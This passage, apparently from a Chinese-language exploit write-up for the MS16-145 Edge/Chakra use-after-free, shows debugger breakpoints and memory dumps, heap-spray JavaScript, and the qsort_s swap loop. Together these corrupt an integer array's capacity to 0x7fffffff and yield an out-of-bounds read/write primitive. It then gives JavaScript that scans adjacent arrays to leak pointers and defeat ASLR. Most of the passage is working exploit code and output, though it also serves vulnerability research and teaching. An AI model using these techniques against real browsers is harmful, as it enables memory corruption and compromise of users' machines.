    00000235`48070080  66666666
您可以看到偏移0x28处的值为0x9，偏移0x4c处的值为0x55555555。值0x66666666也可以在偏移0x80处看到；它是影响quicksort算法的地方，并获得我们需要的精确互换。
现在我们可以在qsort_s函数上设置几个断点，将其设置在紧跟它所调用的TypedArrayCompareElementsHelper本机比较函数（最终调用我们的JS比较函数）的指令之后：
    0:010> bp msvcrt!qsort_s+0x3c2
    0:010> bp msvcrt!qsort_s+0x194
现在我们恢复执行，几秒钟后，断点就被击中。如果一切顺利的话，ArrayBuffer应该被释放，并且其中一个喷射的整数数组的内存被回收：
    0:024> g
    Breakpoint 2 hit
    msvcrt!qsort_s+0x194:
    00007ff8`138ffe84 85c0            test    eax,eax
    0:010> dds 00000235`48070000
    00000235`48070000  00000000
    00000235`48070004  00000000
    00000235`48070008  0000ffe0
    00000235`4807000c  00000000
    00000235`48070010  00000000
    00000235`48070014  00000000
    00000235`48070018  00009e75
    00000235`4807001c  00000000
    00000235`48070020  00000000         // Js::SparseArraySegment object starts here
    00000235`48070024  00003ff2
    00000235`48070028  00003ff2         // reserved capacity of the integer array; it occupies the position of the 0x9 value that will be swapped
    00000235`4807002c  00000000
    00000235`48070030  00000000
    00000235`48070034  00000000
    00000235`48070038  41414141         // elements of the integer array start here
    00000235`4807003c  41414141
    00000235`48070040  41414141
    00000235`48070044  41414141
    00000235`48070048  41414141
    00000235`4807004c  7fffffff         // this one occupies the position of the 0x55555555 value which is going to be swapped
    00000235`48070050  41414141
    00000235`48070054  41414141
太棒了！我们的一个喷射的整数数组现在占据了以前由ArrayBuffer对象的原始缓冲区占据的内存。qsort_s的交换代码现在将以偏移量0x28（以前的UAF：值0x9，现在值为int数组的容量）处的dword与偏移量0x4c处的dword（之前的UAF：数组元素，值为0x55555555，现在：值为0x7fffffff的数组元素）进行交换
。
交换发生在下面的循环中：
    qsort_s+1B0  loc_11012FEA0:
    qsort_s+1B0                  movzx   eax, byte ptr [rdx]        ; grab a byte from the dword @ offset 0x4c
    qsort_s+1B3                  movzx   ecx, byte ptr [r9+rdx]     ; grab a byte from the dword @ offset 0x28
    qsort_s+1B8                  mov     [r9+rdx], al               ; swap
    qsort_s+1BC                  mov     [rdx], cl                  ; swap
    qsort_s+1BE                  lea     rdx, [rdx+1]               ; proceed with the next byte of the dwords
    qsort_s+1C2                  sub     r8, 1
    qsort_s+1C6                  jnz     short loc_11012FEA0        ; loop
成功交换后，int数组看起来像下面这样，这表明我们已经用非常大的值（0x7fffffff）覆盖了原来的容量：
    0:010> dds 00000235`48070000
    00000235`48070000  00000000
    00000235`48070004  00000000
    00000235`48070008  0000ffe0
    00000235`4807000c  00000000
    00000235`48070010  00000000
    00000235`48070014  00000000
    00000235`48070018  00009e75
    00000235`4807001c  00000000
    00000235`48070020  00000000         // Js::SparseArraySegment object starts here
    00000235`48070024  00003ff2
    00000235`48070028  7fffffff         //  = N。
**泄漏指针**
现在，我们已经取得了一个R /
W原语，下面我们就要开始泄露几个指针，以便可以推断一些模块的地址并绕过ASLR。下面，我们通过在JS函数reclaim中将喷射的整数数组与一些字符串对象的数组交插来实现这一点：
    function reclaim(){
        var NUMBER_ARRAYS = 10000;
        arr = new Array(NUMBER_ARRAYS);
        var the_string = "MS16-145";
        for (var i = 0; i < NUMBER_ARRAYS; i++) {
            if ((i % 10) == 9){
                the_element = the_string;
                /* Allocate an array of strings */
                arr[i] = new Array((0x10000-0x38)/8);   //sizeof(ptr) == 8
            }
            else{
                the_element = 0x41414141;
                /* Allocate an array of integers */
                arr[i] = new Array((0x10000-0x38)/4);   //sizeof(int) == 4
            }
            for (var j = 0; j < arr[i].length; j++) {
                arr[i][j] = the_element;
            }
        }
    }
这样，在破坏其中一个数组的备用容量后，我们可以在数组边界之外每次读取0x10000字节，遍历相邻的数组，寻找最近的字符串对象数组：
    //Traverse the adjacent arrays, looking for the closest array of string objects
    for (var i = 0; i < (arr.length - corrupted_index); i++){
        base_index = 0x4000 * i;        //Index to make it point to the first element of another array
        //Remember, you need to write at least to offset N if you want to read from offset N
        arr[corrupted_index][base_index + 0x20] = 0x21212121;
        //If it's an array of objects (as opposed to array of ints filled with 0x41414141)
        if (arr[corrupted_index][base_index] != 0x41414141){
            alert("found pointer: 0x" + ud(arr[corrupted_index][base_index+1]).toString(16) + ud(arr[corrupted_index][base_index]).toString(16));
            break;
        }
    }
这里的ud()函数只是一个小帮手，能够以无符号双字的形式读取值：